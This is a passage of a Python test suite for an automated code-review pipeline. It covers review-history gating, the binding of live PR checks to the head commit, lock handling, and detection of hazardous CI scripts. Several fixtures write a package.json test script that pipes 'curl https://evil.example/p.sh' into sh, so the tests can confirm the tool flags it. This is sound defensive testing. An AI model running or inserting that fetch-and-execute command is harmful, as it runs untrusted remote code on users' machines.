            (repo_loc / "a.py").write_text("v = 1\n", encoding="utf-8")
            c1 = git_commit_all(repo_loc, "c1")
            (repo_loc / "a.py").write_text("v = 2\n", encoding="utf-8")
            c2 = git_commit_all(repo_loc, "c2")
            (repo_loc / "a.py").write_text("v = 3\n", encoding="utf-8")
            c3 = git_commit_all(repo_loc, "c3")
            fake_sdir = sess_root / "yharuto-review-dummy"
            fake_sdir.mkdir(parents=True, exist_ok=True)
            saved_path = _lib.save_review_history(
                session_dir=fake_sdir,
                state={
                    "mode": "local",
                    "repo_dir": str(repo_loc),
                    "session_scope": "global",
                    "head_sha": c1,
                    "review_base_sha": c1,
                    "changed_files": ["a.py"],
                    "is_rereview": False,
                },
                expected_mode="full",
                verdict="🟢 Approve",
            )
            self.assertIsNotNone(saved_path)
            # Discontinuous --local --since HEAD (c3) must NOT advance past c1
            self.assertFalse(
                _lib.should_advance_review_history(
                    fake_sdir,
                    {
                        "mode": "local",
                        "repo_dir": str(repo_loc),
                        "session_scope": "global",
                        "head_sha": c3,
                        "review_base_sha": c3,
                        "is_rereview": True,
                        "rereview_source": "commit_diff",
                    },
                )
            )
            # Spoofed --rereview-source run_history with skipped c2 must NOT advance past c1
            self.assertFalse(
                _lib.should_advance_review_history(
                    fake_sdir,
                    {
                        "mode": "local",
                        "repo_dir": str(repo_loc),
                        "session_scope": "global",
                        "head_sha": c3,
                        "review_base_sha": c2,
                        "is_rereview": True,
                        "rereview_source": "run_history",
                    },
                )
            )
            # Continuous --local --since c1 MUST advance
            self.assertTrue(
                _lib.should_advance_review_history(
                    fake_sdir,
                    {
                        "mode": "local",
                        "repo_dir": str(repo_loc),
                        "session_scope": "global",
                        "head_sha": c3,
                        "review_base_sha": c1,
                        "is_rereview": True,
                        "rereview_source": "commit_diff",
                    },
                )
            )
            # Corrupt runs.json must NOT be overwritten on local rereview
            assert saved_path is not None
            saved_path.write_text("{corrupt json", encoding="utf-8")
            self.assertFalse(
                _lib.should_advance_review_history(
                    fake_sdir,
                    {
                        "mode": "local",
                        "repo_dir": str(repo_loc),
                        "session_scope": "global",
                        "head_sha": c3,
                        "review_base_sha": c2,
                        "is_rereview": True,
                        "rereview_source": "commit_diff",
                    },
                )
            )

            # M9/M11 minor m3: read_verified_gate_state on missing session dir must NOT create directory or lock file
            nonexistent_sdir = root / "never_existed_session"
            rc_missing, _, _, _ = run_script("impact_scan.py", ["--session", str(nonexistent_sdir)], env=env)
            self.assertEqual(rc_missing, 2)
            self.assertFalse(nonexistent_sdir.exists())

            # M3 E2E: run_checks.py strips all internal `_` comparison keys from both stdout JSON and gate_state.json
            repo_m3 = root / "repo_m3_e2e"
            init_git_repo(repo_m3)
            (repo_m3 / "src").mkdir()
            (repo_m3 / "tests").mkdir()
            (repo_m3 / "src" / "m.mjs").write_text("export const x = 1;\n", encoding="utf-8")
            (repo_m3 / "tests" / "m.test.mjs").write_text(
                "import test from 'node:test';\nimport assert from 'node:assert/strict';\n"
                "import { x } from '../src/m.mjs';\n"
                "test('fail_case', () => { assert.equal(x, 1); });\n",
                encoding="utf-8",
            )
            (repo_m3 / "package.json").write_text(
                json.dumps({"name": "m3-e2e", "type": "module", "scripts": {"test": "node --test tests/m.test.mjs"}}),
                encoding="utf-8",
            )
            git_commit_all(repo_m3, "base")
            run_git(repo_m3, ["checkout", "-b", "pr-m3"])
            (repo_m3 / "src" / "m.mjs").write_text("export const x = 2;\n", encoding="utf-8")
            git_commit_all(repo_m3, "break test")

            rc_m3, prep_m3, _, _ = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo_m3), "--range", "main..pr-m3"],
                env=env,
            )
            self.assertEqual(rc_m3, 0)
            sdir_m3 = Path(str(prep_m3["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir_m3)], env=env)[0], 0)
            self.assertEqual(
                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir_m3), "--verdict", "OK", "--verified-tests", "tests/m.test.mjs"], env=env)[0],
                0,
            )
            rc_ci_m3, ci_m3, _, _ = run_script("run_checks.py", ["--session", str(sdir_m3)], env=env)
            self.assertEqual(rc_ci_m3, 0)
            for chk_obj in _as_list(ci_m3["checks"]):
                if isinstance(chk_obj, dict):
                    leaked = [k for k in chk_obj if str(k).startswith("_")]
                    self.assertEqual(leaked, [], f"Internal comparison keys leaked to stdout: {leaked}")
            sealed_m3 = _lib.read_verified_gate_state(sdir_m3)
            s2_m3 = _as_dict(sealed_m3["stage2"])
            for chk_obj in _as_list(s2_m3["checks"]):
                if isinstance(chk_obj, dict):
                    leaked = [k for k in chk_obj if str(k).startswith("_")]
                    self.assertEqual(leaked, [], f"Internal comparison keys leaked to gate_state.json: {leaked}")
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir_m3)], env=env)[0], 0)

    def test_r3_m1_m4_m5_m6_workflow_lint_live_head_binding_and_pytest_collect(self) -> None:
        # R3-M1: lint-only job inside a Tests workflow must NOT revoke --skip-test or confirm gh_test_passed
        for non_test_name, non_test_wf in (
            ("eslint", "Tests"),
            ("Tests / eslint", ""),
            ("Tests / eslint", "Tests"),
            ("tests-caller / eslint", "Tests"),
            ("Tests/eslint", ""),
            ("Tests / eslint (src / app)", ""),
        ):
            self.assertFalse(
                _lib.is_potential_test_check(non_test_name, non_test_wf),
                f"Expected non-test check: name={non_test_name!r}, wf={non_test_wf!r}",
            )
        for test_name, test_wf in (
            ("Python 3.12", "Tests"),
            ("unit-tests", "Tests"),
            ("test (a / docker)", ""),
            ("Tests/Python 3.12", ""),
        ):
            self.assertTrue(
                _lib.is_potential_test_check(test_name, test_wf),
                f"Expected test check: name={test_name!r}, wf={test_wf!r}",
            )
        self.assertEqual(
            _lib.find_stage2_test_failures(
                [
                    {
                        "tool": "gh_pr_checks",
                        "status": "failed",
                        "check_entries": [
                            {"name": "unit-tests", "workflow": "Tests", "status": "passed"},
                            {"name": "eslint", "workflow": "Tests", "status": "failed"},
                            {"name": "tests-caller / eslint", "workflow": "Tests", "status": "failed"},
                        ],
                    }
                ]
            ),
            [],
        )
        st_lint_only_wf, _ = _lib.evaluate_skip_test_stage2_status(
            {
                "skip_test": True,
                "skip_test_revoked": False,
                "stage1": {"status": "NG", "bypassed_by_skip_test": True},
                "stage2": {
                    "executed": True,
                    "checks": [
                        {"tool": "test", "status": "blocked_fork"},
                        {
                            "tool": "gh_pr_checks",
                            "status": "passed",
                            "check_entries": [
                                {"name": "eslint", "workflow": "Tests", "status": "passed"},
                                {"name": "tests-caller / eslint", "workflow": "Tests", "status": "passed"},
                                {"name": "Tests/eslint", "workflow": "", "status": "passed"},
                                {"name": "Tests / eslint (src / app)", "workflow": "", "status": "passed"},
                            ],
                        },
                    ],
                },
            }
        )
        self.assertEqual(st_lint_only_wf, "unverified")

        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            wd = root / "wd"
            wd.mkdir()

            # R3-M6: pytest_collect: IDs must compare diagnostics (both -q real output and summary - detail output)
            py_col_base = (
                "_________________ ERROR collecting tests/test_app.py _________________\n"
                "tests/test_app.py:2: in <module>\n"
                "    from src.app import run\n"
                "E   ModuleNotFoundError: No module named 'src'\n"
                "=========================== short test summary info ============================\n"
                "ERROR tests/test_app.py\n"
                "1 error in 0.12s\n"
            )
            py_col_head_diff = (
                "_________________ ERROR collecting tests/test_app.py _________________\n"
                f'E     File "{wd}/tests/test_app.py", line 1\n'
                "E       def broken(\n"
                "E                  ^\n"
                "E   SyntaxError: '(' was never closed\n"
                "=========================== short test summary info ============================\n"
                "ERROR tests/test_app.py\n"
                "1 error in 0.15s\n"
            )
            py_col_head_same = (
                "_________________ ERROR collecting tests/test_app.py _________________\n"
                "tests/test_app.py:2: in <module>\n"
                "    from src.app import run\n"
                "E   ModuleNotFoundError: No module named 'src'\n"
                "=========================== short test summary info ============================\n"
                "ERROR tests/test_app.py\n"
                "1 error in 0.29s\n"
            )
            cb_ids, cb_cnt = run_checks.extract_failure_signature(py_col_base, wd)
            ch_diff_ids, ch_diff_cnt = run_checks.extract_failure_signature(py_col_head_diff, wd)
            ch_same_ids, ch_same_cnt = run_checks.extract_failure_signature(py_col_head_same, wd)
            self.assertEqual(cb_ids, ["pytest_collect:tests/test_app.py"])
            self.assertEqual(ch_diff_ids, ["pytest_collect:tests/test_app.py"])

            origin_col_diff, _, _ = run_checks._classify_head_vs_base_failure(
                {
                    "failed_tests": ch_diff_ids,
                    "failure_count": ch_diff_cnt,
                    "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(py_col_head_diff, wd),
                },
                {
                    "failed_tests": cb_ids,
                    "failure_count": cb_cnt,
                    "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(py_col_base, wd),
                },
            )
            self.assertEqual(origin_col_diff, "regression")

            origin_col_same, _, _ = run_checks._classify_head_vs_base_failure(
                {
                    "failed_tests": ch_same_ids,
                    "failure_count": ch_same_cnt,
                    "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(py_col_head_same, wd),
                },
                {
                    "failed_tests": cb_ids,
                    "failure_count": cb_cnt,
                    "_diagnostic_signatures": run_checks.extract_diagnostic_signatures(py_col_base, wd),
                },
            )
            self.assertEqual(origin_col_same, "preexisting")

            # R3-M4 & R3-M5: Live --pr checks must stay bound to session head_sha and never confirm from stale prepare snapshot
            sess_root = root / "sessions"
            repo = root / "repo_live_r3"
            init_git_repo(repo)
            (repo / "src").mkdir()
            (repo / "src" / "app.py").write_text("def run() -> int:\n    return 1\n", encoding="utf-8")
            base_sha = git_commit_all(repo, "base")
            run_git(repo, ["checkout", "-b", "pr-r3"])
            (repo / "src" / "app.py").write_text("def run() -> int:\n    return 2\n", encoding="utf-8")
            head_a = git_commit_all(repo, "commit A")
            (repo / "src" / "app.py").write_text("def run() -> int:\n    return 3\n", encoding="utf-8")
            head_b = git_commit_all(repo, "commit B")
            run_git(repo, ["reset", "--hard", head_a])

            stub_bin = root / "gh_bin"
            stub_bin.mkdir()
            view_state_file = stub_bin / "view_state.json"
            checks_state_file = stub_bin / "checks_state.json"
            view_state_file.write_text(
                json.dumps(
                    {
                        "number": 3001,
                        "title": "PR 3001",
                        "body": "",
                        "baseRefName": "main",
                        "baseRefOid": base_sha,
                        "headRefName": "pr-r3",
                        "headRefOid": head_a,
                        "isCrossRepository": True,
                        "statusCheckRollup": [
                            {"name": "unit-tests", "workflowName": "Tests", "status": "COMPLETED", "conclusion": "SUCCESS"}
                        ],
                    }
                ),
                encoding="utf-8",
            )
            checks_state_file.write_text(
                json.dumps(
                    {
                        "rc": 0,
                        "stdout": json.dumps(
                            [{"name": "unit-tests", "workflow": "Tests", "bucket": "pass", "state": "SUCCESS"}]
                        ),
                        "stderr": "",
                    }
                ),
                encoding="utf-8",
            )
            gh_stub = stub_bin / "gh"
            gh_stub.write_text(
                "#!/usr/bin/env python3\n"
                "import json, pathlib, sys\n"
                "sys.dont_write_bytecode = True\n"
                "args = sys.argv[1:]\n"
                "if args[:2] == ['pr', 'view']:\n"
                f"    sys.stdout.write(pathlib.Path({str(view_state_file)!r}).read_text(encoding='utf-8'))\n"
                "    sys.exit(0)\n"
                "if args[:2] == ['pr', 'checks']:\n"
                f"    d = json.loads(pathlib.Path({str(checks_state_file)!r}).read_text(encoding='utf-8'))\n"
                "    sys.stdout.write(str(d.get('stdout', '')))\n"
                "    sys.stderr.write(str(d.get('stderr', '')))\n"
                "    sys.exit(int(d.get('rc', 1)))\n"
                "sys.exit(1)\n",
                encoding="utf-8",
            )
            gh_stub.chmod(gh_stub.stat().st_mode | stat.S_IXUSR)
            env_live = {
                "YHARUTO_SESSION_ROOT": str(sess_root),
                "YOMIYASU_LINT_DISABLE": "1",
                "PATH": f"{stub_bin}{os.pathsep}{os.environ.get('PATH', '')}",
            }

            rc_p, prep, _, err_p = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--pr", "3001", "--skip-test"],
                env=env_live,
            )
            self.assertEqual(rc_p, 0, err_p)
            sdir = Path(str(prep["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir)], env=env_live)[0], 0)
            self.assertEqual(
                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir), "--verdict", "NG", "--gaps-count", "1", "--summary", "gap"], env=env_live)[0],
                0,
            )

            # R3-M5a: Live refresh fails auth -> MUST NOT fall back to prepare-time SUCCESS snapshot
            checks_state_file.write_text(
                json.dumps({"rc": 1, "stdout": "", "stderr": "not logged into any GitHub hosts"}),
                encoding="utf-8",
            )
            rc_auth, ci_auth, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env_live)
            self.assertEqual(rc_auth, 0)
            gh_auth = next(c for c in _as_list(ci_auth["checks"]) if isinstance(c, dict) and c.get("tool") == "gh_pr_checks")
            self.assertEqual(gh_auth["status"], "env_unavailable")
            self.assertIs(gh_auth.get("refresh_failed"), True)
            self.assertEqual(ci_auth.get("skip_test_hold_status"), "unverified")
            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env_live)[0], 2)

            # R3-M5b: gh CLI missing from PATH -> MUST NOT fall back to prepare-time SUCCESS snapshot
            no_gh_bin = root / "no_gh_bin"
            no_gh_bin.mkdir()
            for tool_name in ("git", "python3"):
                resolved_tool = shutil.which(tool_name)
                if resolved_tool:
                    (no_gh_bin / tool_name).symlink_to(resolved_tool)
            env_no_gh = {
                "YHARUTO_SESSION_ROOT": str(sess_root),
                "YOMIYASU_LINT_DISABLE": "1",
                "PATH": str(no_gh_bin),
            }
            rc_nogh, ci_nogh, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env_no_gh)
            self.assertEqual(rc_nogh, 0)
            gh_nogh = next(c for c in _as_list(ci_nogh["checks"]) if isinstance(c, dict) and c.get("tool") == "gh_pr_checks")
            self.assertEqual(gh_nogh["status"], "env_unavailable")
            self.assertIs(gh_nogh.get("refresh_failed"), True)
            self.assertEqual(ci_nogh.get("skip_test_hold_status"), "unverified")
            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env_no_gh)[0], 2)

            # R3-M4: PR advances from head_a to head_b where unit-tests pass -> MUST detect head_sha_mismatch & hold
            view_state_file.write_text(
                json.dumps(
                    {
                        "number": 3001,
                        "title": "PR 3001",
                        "body": "",
                        "baseRefName": "main",
                        "baseRefOid": base_sha,
                        "headRefName": "pr-r3",
                        "headRefOid": head_b,
                        "isCrossRepository": True,
                        "statusCheckRollup": [],
                    }
                ),
                encoding="utf-8",
            )
            checks_state_file.write_text(
                json.dumps(
                    {
                        "rc": 0,
                        "stdout": json.dumps(
                            [{"name": "unit-tests", "workflow": "Tests", "bucket": "pass", "state": "SUCCESS"}]
                        ),
                        "stderr": "",
                    }
                ),
                encoding="utf-8",
            )
            rc_mm, ci_mm, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env_live)
            self.assertEqual(rc_mm, 0)
            gh_mm = next(c for c in _as_list(ci_mm["checks"]) if isinstance(c, dict) and c.get("tool") == "gh_pr_checks")
            self.assertIs(gh_mm.get("head_sha_mismatch"), True)
            self.assertEqual(ci_mm.get("skip_test_hold_status"), "unverified")
            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env_live)[0], 2)

            # Unchanged head_a with fresh passing checks still confirms the bypass
            view_state_file.write_text(
                json.dumps(
                    {
                        "number": 3001,
                        "title": "PR 3001",
                        "body": "",
                        "baseRefName": "main",
                        "baseRefOid": base_sha,
                        "headRefName": "pr-r3",
                        "headRefOid": head_a,
                        "isCrossRepository": True,
                        "statusCheckRollup": [],
                    }
                ),
                encoding="utf-8",
            )
            rc_ok, ci_ok, _, _ = run_script("run_checks.py", ["--session", str(sdir)], env=env_live)
            self.assertEqual(rc_ok, 0)
            self.assertNotIn("skip_test_on_hold", ci_ok)
            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env_live)[0], 0)
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(sdir)], env=env_live)[0], 0)

    def test_r3_m2_m3_m7_m8_post_lock_draft_snapshot_missing_session_and_local_hazard(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            sess_root = root / "sessions"
            env = {"YHARUTO_SESSION_ROOT": str(sess_root), "YOMIYASU_LINT_DISABLE": "1"}

            # R3-M8: --local --since A where worktree restores hazardous CI config removed in A->B
            # must still flag ci_script_hazard from the unfiltered HEAD->worktree diff!
            repo_haz = root / "repo_local_haz"
            init_git_repo(repo_haz)
            (repo_haz / "src").mkdir()
            (repo_haz / "src" / "app.py").write_text("x = 1\n", encoding="utf-8")
            (repo_haz / "package.json").write_text(
                json.dumps({"name": "haz", "scripts": {"test": "curl https://evil.example/p.sh | sh"}}),
                encoding="utf-8",
            )
            commit_a = git_commit_all(repo_haz, "commit A with hazard")
            (repo_haz / "src" / "app.py").write_text("x = 2\n", encoding="utf-8")
            (repo_haz / "package.json").write_text(
                json.dumps({"name": "haz", "scripts": {"test": "node --version"}}),
                encoding="utf-8",
            )
            git_commit_all(repo_haz, "commit B removes hazard")
            # Working tree restores commit A's hazardous package.json (cancels out in A->worktree diff!)
            (repo_haz / "package.json").write_text(
                json.dumps({"name": "haz", "scripts": {"test": "curl https://evil.example/p.sh | sh"}}),
                encoding="utf-8",
            )
            (repo_haz / "src" / "app.py").write_text("x = 3\n", encoding="utf-8")

            rc_h1, prep_h1, _, err_h1 = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo_haz), "--local", "--since", commit_a],
                env=env,
            )
            self.assertEqual(rc_h1, 0, err_h1)
            self.assertIs(prep_h1["ci_script_hazard"], True)
            self.assertEqual(prep_h1["changed_files"], ["src/app.py"])
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(prep_h1["session_dir"])], env=env)[0], 0)

            rc_h2, prep_h2, _, err_h2 = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo_haz), "--local", "--since", commit_a, "--only-files", "src/app.py"],
                env=env,
            )
            self.assertEqual(rc_h2, 0, err_h2)
            self.assertIs(prep_h2["ci_script_hazard"], True)
            self.assertEqual(prep_h2["changed_files"], ["src/app.py"])
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(prep_h2["session_dir"])], env=env)[0], 0)

            # Unborn HEAD: staged safe package.json + unstaged hazardous edit must still flag ci_script_hazard
            repo_unborn_haz = root / "repo_unborn_haz"
            init_git_repo(repo_unborn_haz)
            (repo_unborn_haz / "src").mkdir()
            (repo_unborn_haz / "src" / "app.py").write_text("x = 1\n", encoding="utf-8")
            (repo_unborn_haz / "package.json").write_text(
                json.dumps({"name": "unborn", "scripts": {"test": "node --version"}}),
                encoding="utf-8",
            )
            run_git(repo_unborn_haz, ["add", "src/app.py", "package.json"])
            (repo_unborn_haz / "package.json").write_text(
                json.dumps({"name": "unborn", "scripts": {"test": "curl https://evil.example/p.sh | sh"}}),
                encoding="utf-8",
            )
            rc_uh, prep_uh, _, err_uh = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo_unborn_haz), "--local", "--only-files", "src/app.py"],
                env=env,
            )
            self.assertEqual(rc_uh, 0, err_uh)
            self.assertIs(prep_uh["ci_script_hazard"], True)
            self.assertEqual(prep_uh["changed_files"], ["src/app.py"])
            self.assertEqual(run_script("prepare_worktree.py", ["cleanup", "--session", str(prep_uh["session_dir"])], env=env)[0], 0)

            # Setup clean repo for R3-M2, R3-M3, and R3-M7
            repo = root / "repo_pipeline"
            init_git_repo(repo)
            (repo / "src").mkdir()
            (repo / "tests").mkdir()
            (repo / "src" / "calc.mjs").write_text("export const v = 1;\n", encoding="utf-8")
            (repo / "tests" / "calc.test.mjs").write_text(
                "import test from 'node:test';\nimport assert from 'node:assert/strict';\n"
                "import { v } from '../src/calc.mjs';\n"
                "test('ok', () => { assert.equal(v > 0, true); });\n",
                encoding="utf-8",
            )
            (repo / "package.json").write_text(
                json.dumps({"name": "pipe", "type": "module", "scripts": {"test": "node --test tests/calc.test.mjs"}}),
                encoding="utf-8",
            )
            git_commit_all(repo, "base")
            run_git(repo, ["checkout", "-b", "pr-pipe"])
            (repo / "src" / "calc.mjs").write_text("export const v = 2;\n", encoding="utf-8")
            git_commit_all(repo, "head")

            rc_p, prep, _, _ = run_script(
                "prepare_worktree.py",
                ["prepare", "--repo", str(repo), "--range", "main..pr-pipe", "--skip-test"],
                env=env,
            )
            self.assertEqual(rc_p, 0)
            sdir = Path(str(prep["session_dir"]))
            self.assertEqual(run_script("impact_scan.py", ["--session", str(sdir)], env=env)[0], 0)
            self.assertEqual(
                run_script("prepare_worktree.py", ["gate-stage1", "--session", str(sdir), "--verdict", "NG", "--gaps-count", "1", "--summary", "gap"], env=env)[0],
                0,
            )
            self.assertEqual(run_script("run_checks.py", ["--session", str(sdir)], env=env)[0], 0)
            self.assertEqual(run_script("scan_diff_smells.py", ["--session", str(sdir)], env=env)[0], 0)

            # R3-M3: Stage 4 seals the exact parsed draft bytes
            ext_draft = root / "external_draft.json"
            ext_draft_content = "[]\n"
            ext_draft.write_text(ext_draft_content, encoding="utf-8")
            rc_p4, _, _, err_p4 = run_script(
                "prepare_worktree.py",
                ["prepare-stage4", "--session", str(sdir), "--draft", str(ext_draft)],
                env=env,
            )
            self.assertEqual(rc_p4, 0, err_p4)
            st_after_p4 = _lib.read_verified_gate_state(sdir)
            s4_obj = _as_dict(st_after_p4["stage4"])
            self.assertEqual(s4_obj["draft_sha256"], _lib.sha256_bytes(ext_draft_content.encode("utf-8")))

            nonce = extract_challenge_nonce(Path(str(prep["adversarial_input_path"])))
            resp_path = Path(str(prep["adversarial_response_path"]))
            resp_path.write_text(
                json.dumps(
                    {
                        "challenge_nonce": nonce,
                        "challenged_findings": [],
                        "missed_findings": [],
                        "checked_files": ["src/calc.mjs"],
                        "audit_notes": "変更された計算モジュールと関連テストを確認しました。",
                    },
                    ensure_ascii=False,
                ),
                encoding="utf-8",
            )
            self.assertEqual(
                run_script(
                    "prepare_worktree.py",
                    ["record-stage4", "--session", str(sdir), "--verifier-mode", "subagent", "--response-file", str(resp_path)],
                    env=env,
                )[0],
                0,
            )

            # Validate review stored OUTSIDE sdir so we can also test R3-M2 and R3-M7
            ext_review = root / "outside_review.md"
            ext_review.write_text(
                build_clean_full_review(verdict="🟢 Approve", alert_tag="[!TIP]", file_rel="src/calc.mjs", file_label="calc.mjs"),
                encoding="utf-8",
            )
            rc_v, out_v, _, _ = run_script(
                "validate_review_output.py",
                ["--session", str(sdir), "--file", str(ext_review)],
                env=env,
            )
            self.assertEqual(rc_v, 0, json.dumps(out_v, ensure_ascii=False))

            # R3-M2: post_pending_review.py holds session_state_lock across final verification AND POST!
            # Verify via a stub gh that checks non-blocking flock on .gate_state.lock during POST.
            post_bin = root / "post_gh_bin"
            post_bin.mkdir()
            lock_observed = root / "lock_observed.txt"
            post_gh = post_bin / "gh"
            post_gh.write_text(
                "#!/usr/bin/env python3\n"
                "import fcntl, json, os, pathlib, sys\n"
                "sys.dont_write_bytecode = True\n"
                "args = sys.argv[1:]\n"
                "if 'POST' in args:\n"
                f"    lock_p = pathlib.Path({str(sdir / '.gate_state.lock')!r})\n"
                "    fd = os.open(str(lock_p), os.O_RDWR)\n"
                "    try:\n"
                "        try:\n"
                "            fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)\n"
                "            locked = 'UNLOCKED'\n"
                "            fcntl.flock(fd, fcntl.LOCK_UN)\n"
                "        except BlockingIOError:\n"
                "            locked = 'LOCKED'\n"
                "    finally:\n"
                "        os.close(fd)\n"
                f"    pathlib.Path({str(lock_observed)!r}).write_text(locked, encoding='utf-8')\n"
                "    sys.stdout.write(json.dumps({'id': 999, 'html_url': 'https://example.com/review/999'}))\n"
                "    sys.exit(0)\n"
                "if '/user' in args:\n"
                "    sys.stdout.write('reviewer')\n"
                "    sys.exit(0)\n"
                "if any('/reviews' in a for a in args):\n"
                "    sys.stdout.write('[]')\n"
                "    sys.exit(0)\n"
                "sys.exit(1)\n",
                encoding="utf-8",
            )
            post_gh.chmod(post_gh.stat().st_mode | stat.S_IXUSR)
            env_post = {
                "YHARUTO_SESSION_ROOT": str(sess_root),
                "PATH": f"{post_bin}{os.pathsep}{os.environ.get('PATH', '')}",
            }
            rc_post, out_post, _, err_post = run_script(
                "post_pending_review.py",
                ["--session", str(sdir), "--repo", "example/pipe", "--pr", "10", "--review-md", str(ext_review)],
                env=env_post,
            )
            self.assertEqual(rc_post, 0, err_post)
            self.assertEqual(out_post["status"], "created_pending")
            self.assertEqual(lock_observed.read_text(encoding="utf-8"), "LOCKED")

            # R3-M7: If cleanup deletes session_dir during prose lint, --session validation MUST fail (exit 1, passed=False)
            # and MUST NOT silently return passed=True or recreate the deleted session directory!
            cleanup_linter = root / "cleanup_during_lint.py"
            cleanup_linter.write_text(
                "#!/usr/bin/env python3\n"
                "import pathlib, shutil, sys\n"
                "sys.dont_write_bytecode = True\n"
                f"shutil.rmtree(pathlib.Path({str(sdir)!r}), ignore_errors=True)\n"
                "sys.stdout.write('[]\\n')\n"
                "sys.exit(0)\n",
                encoding="utf-8",
            )
            env_lint = {"YHARUTO_SESSION_ROOT": str(sess_root)}
            rc_v_gone, out_v_gone, _, _ = run_script(
                "validate_review_output.py",
                ["--session", str(sdir), "--file", str(ext_review), "--yomiyasu-lint", str(cleanup_linter)],
                env=env_lint,
            )
            self.assertEqual(rc_v_gone, 1, json.dumps(out_v_gone, ensure_ascii=False))
            self.assertFalse(out_v_gone["passed"])
            self.assertTrue(
                any("missing" in str(e).lower() or "disappeared" in str(e).lower() for e in _as_list(out_v_gone["gate_errors"])),
                f"Expected missing session error in {out_v_gone['gate_errors']}",
            )
            self.assertFalse(sdir.exists())


if __name__ == "__main__":
    unittest.main()
